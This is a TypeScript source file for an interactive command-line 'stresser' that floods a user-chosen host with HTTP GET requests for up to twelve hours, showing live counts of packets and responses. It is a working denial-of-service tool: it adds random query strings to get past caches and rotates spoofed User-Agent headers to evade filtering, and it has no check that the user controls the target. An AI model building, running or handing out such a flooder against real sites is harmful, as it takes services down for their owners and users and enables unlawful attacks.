import Dayjs from 'dayjs';
import DayjsDuration from 'dayjs/plugin/duration';
Dayjs.extend(DayjsDuration);
import RandomUA from 'random-useragent';
import { typof } from 'typof';
import { Styles } from '@keift/utils';
import Readline from 'readline';

import Package from '../package.json';

const intervals = new Map<string, NodeJS.Timeout>();

const rl = Readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const question = (query: string) =>
  new Promise<string>((resolve) => {
    rl.question(query, resolve);
  });

const print = () => {
  console.clear();

  console.log('\n');
  console.log(`     ${Styles.fg.gray}#####   ######   #####    #####    #####    #####`, Styles.reset);
  console.log(`    ${Styles.fg.gray}##         ##     ##  ##   ##      ##       ##`, Styles.reset);
  console.log(`     ${Styles.fg.gray}####      ##     #####    ####     ####     ####`, Styles.reset);
  console.log(`        ${Styles.fg.gray}##     ##     ##  ##   ##          ##       ##`, Styles.reset);
  console.log(`    ${Styles.fg.gray}#####      ##     ##  ##   #####   #####    #####`, Styles.reset);
  console.log('');
  console.log(`                                                   ${Styles.fg.white}v${Package.version}`, Styles.reset);
  console.log('');
};

const run = async () => {
  print();

  const target_question = await question(`  ${Styles.fg.blue}Target${Styles.fg.gray}: ${Styles.fg.white}`);

  print();

  const target = target_question
    .toLowerCase()
    .trim()
    .replace(/^https?:\/\//, '')
    .split('/')[0];

  if (!target) {
    console.log(`  ${Styles.fg.red}Field target cannot be left blank.`, Styles.reset);

    setTimeout(() => void run(), 2500);

    return;
  }

  if (!typof(target).includes('string')) {
    console.log(`  ${Styles.fg.red}Field target must be a string.`, Styles.reset);

    setTimeout(() => void run(), 2500);

    return;
  }

  console.log(`  ${Styles.fg.blue}Target${Styles.fg.gray}: ${Styles.fg.white}${target}`, Styles.reset);

  const throttling_question = await question(`  ${Styles.fg.blue}Throttling${Styles.fg.gray}: ${Styles.fg.white}`);

  print();

  if (!throttling_question) {
    console.log(`  ${Styles.fg.red}Field throttling cannot be left blank.`, Styles.reset);

    setTimeout(() => void run(), 2500);

    return;
  }

  if (!typof(throttling_question).includes('integer')) {
    console.log(`  ${Styles.fg.red}Field throttling must be a integer.`, Styles.reset);

    setTimeout(() => void run(), 2500);

    return;
  }

  const throttling = Math.max(1, Math.min(Number(throttling_question), 100));

  console.log(`  ${Styles.fg.blue}Target${Styles.fg.gray}: ${Styles.fg.white}${target}`, Styles.reset);
  console.log(`  ${Styles.fg.blue}Throttling${Styles.fg.gray}: ${Styles.fg.white}${String(throttling)}`, Styles.reset);

  const duration_question = await question(`  ${Styles.fg.blue}Duration (s)${Styles.fg.gray}: ${Styles.fg.white}`);

  print();

  if (!duration_question) {
    console.log(`  ${Styles.fg.red}Field duration cannot be left blank.`, Styles.reset);

    setTimeout(() => void run(), 2500);

    return;
  }

  if (!typof(duration_question).includes('integer')) {
    console.log(`  ${Styles.fg.red}Field duration must be a integer.`, Styles.reset);

    setTimeout(() => void run(), 2500);

    return;
  }

  const duration = Math.max(1, Math.min(Number(duration_question), 43200));

  console.log(`  ${Styles.fg.blue}Target${Styles.fg.gray}: ${Styles.fg.white}${target}`, Styles.reset);
  console.log(`  ${Styles.fg.blue}Throttling${Styles.fg.gray}: ${Styles.fg.white}${String(throttling)}`, Styles.reset);
  console.log(`  ${Styles.fg.blue}Duration (s)${Styles.fg.gray}: ${Styles.fg.white}${String(duration)}`, Styles.reset);

  console.log('');
  console.log(`  ${Styles.fg.magenta}Status                          ${Styles.fg.yellow}Preparing... ⟳`, Styles.reset);
  console.log(`  ${Styles.fg.magenta}Packets Sent                    ${Styles.fg.gray}--`, Styles.reset);
  console.log(`  ${Styles.fg.magenta}Successful Resp.                ${Styles.fg.gray}--`, Styles.reset);
  console.log(`  ${Styles.fg.magenta}Unsuccessful Resp.              ${Styles.fg.gray}--`, Styles.reset);
  console.log(`  ${Styles.fg.magenta}Remaining Time                  ${Styles.fg.gray}--`, Styles.reset);
  console.log('');

  await Bun.sleep(1000);

  print();

  console.log(`  ${Styles.fg.blue}Target${Styles.fg.gray}: ${Styles.fg.white}${target}`, Styles.reset);
  console.log(`  ${Styles.fg.blue}Throttling${Styles.fg.gray}: ${Styles.fg.white}${String(throttling)}`, Styles.reset);
  console.log(`  ${Styles.fg.blue}Duration (s)${Styles.fg.gray}: ${Styles.fg.white}${String(duration)}`, Styles.reset);

  console.log('');
  console.log(`  ${Styles.fg.magenta}Status                          ${Styles.fg.yellow}Almost Ready... ⟳`, Styles.reset);
  console.log(`  ${Styles.fg.magenta}Packets Sent                    ${Styles.fg.gray}--`, Styles.reset);
  console.log(`  ${Styles.fg.magenta}Successful Resp.                ${Styles.fg.gray}--`, Styles.reset);
  console.log(`  ${Styles.fg.magenta}Unsuccessful Resp.              ${Styles.fg.gray}--`, Styles.reset);
  console.log(`  ${Styles.fg.magenta}Remaining Time                  ${Styles.fg.gray}--`, Styles.reset);

  console.log('');

  await Bun.sleep(2500);

  let running = true;
  let packets_sent = 0;
  let successful_responses = 0;
  let unsuccessful_responses = 0;
  let remaining_time = duration;

  intervals.set(
    'STRESSING',
    setInterval(() => {
      void (async () => {
        for (let i = 0; i < throttling; i++) {
          packets_sent++;

          try {
            const response = await fetch(`http://${target}?${String(Math.random())}=${String(Math.random())}`, {
              method: 'GET',
              headers: {
                'User-Agent': RandomUA.getRandom()
              }
            });

            if ((response.status >= 200 && response.status < 300) || (response.status >= 400 && response.status < 500)) {
              successful_responses++;
            } else unsuccessful_responses++;
          } catch {
            unsuccessful_responses++;
          }
        }
      })();
    })
  );

  let previous_packets_sent = 0;
  let previous_successful_responses = 0;
  let previous_unsuccessful_responses = 0;
  let previous_remaining_time = 0;

  setInterval(() => {
    print();

    console.log(`  ${Styles.fg.blue}Target${Styles.fg.gray}: ${Styles.fg.white}${target}`, Styles.reset);
    console.log(`  ${Styles.fg.blue}Throttling${Styles.fg.gray}: ${Styles.fg.white}${String(throttling)}`, Styles.reset);
    console.log(`  ${Styles.fg.blue}Duration (s)${Styles.fg.gray}: ${Styles.fg.white}${String(duration)}`, Styles.reset);

    console.log('');
    console.log(`  ${Styles.fg.magenta}Status                          ${running ? `${Styles.fg.white}Running ▶` : `${Styles.fg.red}Stopped ■`}`, Styles.reset);
    console.log(`  ${Styles.fg.magenta}Packets Sent                    ${previous_packets_sent !== packets_sent ? Styles.fg.blue : Styles.fg.gray}${String(packets_sent)} ↑`, Styles.reset);
    console.log(`  ${Styles.fg.magenta}Successful Resp.                ${previous_successful_responses !== successful_responses ? Styles.fg.green : Styles.fg.gray}${String(successful_responses)} ↓`, Styles.reset);
    console.log(`  ${Styles.fg.magenta}Unsuccessful Resp.              ${previous_unsuccessful_responses !== unsuccessful_responses ? Styles.fg.red : Styles.fg.gray}${String(unsuccessful_responses)} ⇣`, Styles.reset);
    console.log(`  ${Styles.fg.magenta}Remaining Time                  ${previous_remaining_time !== remaining_time ? Styles.fg.yellow : Styles.fg.gray}${Dayjs.duration(remaining_time, 'seconds').format('HH:mm:ss')} ⏱︎`, Styles.reset);

    console.log('');

    previous_packets_sent = packets_sent;
    previous_successful_responses = successful_responses;
    previous_unsuccessful_responses = unsuccessful_responses;
    previous_remaining_time = remaining_time;
  }, 1000);

  setInterval(() => {
    if (remaining_time === 0) {
      running = false;

      clearInterval(intervals.get('STRESSING'));
      intervals.delete('STRESSING');
    } else remaining_time--;
  }, 1000);
};

void run();
